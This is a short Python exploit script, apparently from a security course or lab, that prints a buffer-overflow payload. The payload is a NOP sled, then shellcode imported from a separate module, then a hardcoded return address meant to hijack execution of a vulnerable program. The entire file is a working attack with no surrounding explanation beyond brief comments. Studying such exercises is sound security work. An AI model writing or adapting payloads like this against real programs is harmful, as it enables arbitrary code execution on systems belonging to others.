import sys
from struct import pack
from shellcode import shellcode

#NOP slide length of total buffer size minus
#the length of the shellcode and length of return adress
#Followed by shellcode
#Followed by return address to execute shellcode
#shell code len is 53
sys.stdout.buffer.write(b"\x90"*(116 - 4 - len(shellcode)) + shellcode + pack("I", 0xbffea33d))

